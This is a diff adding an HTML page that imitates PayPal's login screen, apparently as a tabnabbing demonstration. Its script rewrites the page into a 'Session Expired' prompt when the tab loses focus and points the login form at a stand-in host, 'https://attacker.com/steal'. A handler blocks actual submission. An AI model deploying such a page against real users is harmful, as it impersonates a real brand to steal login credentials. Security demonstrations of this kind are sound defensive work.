@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal - Log In</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background: #f5f7fa;
+            color: #2c2e2f;
+        }
+        
+        .header {
+            background: white;
+            padding: 20px 40px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        
+        .logo {
+            font-size: 32px;
+            font-weight: bold;
+            color: #0070ba;
+        }
+        
+        .container {
+            max-width: 450px;
+            margin: 60px auto;
+            background: white;
+            border-radius: 8px;
+            padding: 50px 40px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        
+        h1 {
+            font-size: 32px;
+            margin-bottom: 30px;
+            color: #2c2e2f;
+            font-weight: 300;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #2c2e2f;
+            font-size: 14px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #cbd2d6;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border-color 0.2s;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #0070ba;
+        }
+        
+        .btn-primary {
+            width: 100%;
+            padding: 14px;
+            background: #0070ba;
+            color: white;
+            border: none;
+            border-radius: 24px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 20px;
+        }
+        
+        .btn-primary:hover {
+            background: #005ea6;
+        }
+        
+        .divider {
+            text-align: center;
+            margin: 30px 0;
+            color: #9da3a6;
+            font-size: 14px;
+            position: relative;
+        }
+        
+        .divider:before,
+        .divider:after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            width: 40%;
+            height: 1px;
+            background: #cbd2d6;
+        }
+        
+        .divider:before {
+            left: 0;
+        }
+        
+        .divider:after {
+            right: 0;
+        }
+        
+        .btn-secondary {
+            width: 100%;
+            padding: 14px;
+            background: white;
+            color: #0070ba;
+            border: 1px solid #0070ba;
+            border-radius: 24px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .btn-secondary:hover {
+            background: #f5f7fa;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            color: #9da3a6;
+            font-size: 13px;
+        }
+        
+        .footer a {
+            color: #0070ba;
+            text-decoration: none;
+        }
+        
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 30px;
+            color: #9da3a6;
+            font-size: 12px;
+        }
+        
+        .secure-badge::before {
+            content: '🔒';
+            margin-right: 6px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">PayPal</div>
+    </div>
+    
+    <div class="container">
+        <h1>Log in to your account</h1>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email">Email or mobile number</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            
+            <button type="submit" class="btn-primary">Log In</button>
+        </form>
+        
+        <div class="divider">or</div>
+        
+        <button class="btn-secondary">Sign Up</button>
+        
+        <div class="secure-badge">
+            Secure login with 128-bit SSL encryption
+        </div>
+    </div>
+    
+    <div class="footer">
+        <p>
+            <a href="#">Having trouble logging in?</a> | 
+            <a href="#">Privacy</a> | 
+            <a href="#">Legal</a>
+        </p>
+        <p style="margin-top: 15px;">© 1999-2024 PayPal, Inc. All rights reserved.</p>
+    </div>
+    
+    <script>
+        // Tabnabbing attack simulation
+        let attacked = false;
+        
+        window.addEventListener('blur', function() {
+            if (!attacked) {
+                // Wait a moment after losing focus
+                setTimeout(function() {
+                    // Transform to phishing page
+                    document.querySelector('.footer p').innerHTML = `
+                        <span style="color: #dc3545; font-weight: bold;">⚠️ SESSION EXPIRED</span><br>
+                        <span style="font-size: 12px;">Please re-enter your credentials to continue</span>
+                    `;
+                    
+                    document.querySelector('h1').textContent = 'Session Expired - Please Log In Again';
+                    document.querySelector('h1').style.color = '#dc3545';
+                    
+                    // Change form action to phishing endpoint
+                    document.getElementById('loginForm').action = 'https://attacker.com/steal';
+                    
+                    // Add warning message
+                    const warning = document.createElement('div');
+                    warning.style.cssText = 'background: #fff3cd; border: 1px solid #ffc107; padding: 15px; margin-bottom: 20px; border-radius: 4px; color: #856404;';
+                    warning.innerHTML = '<strong>⚠️ Security Alert:</strong> Your session has expired. Please log in again to continue.';
+                    document.querySelector('.container').insertBefore(warning, document.querySelector('h1').nextSibling);
+                    
+                    attacked = true;
+                    console.log('🚨 Tabnabbing attack simulated - page transformed to phishing');
+                }, 1500);
+            }
+        });
+        
+        // Prevent form submission
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            alert('This is a test page. Form submission prevented.');
+        });
+    </script>
+</body>
+</html>
+
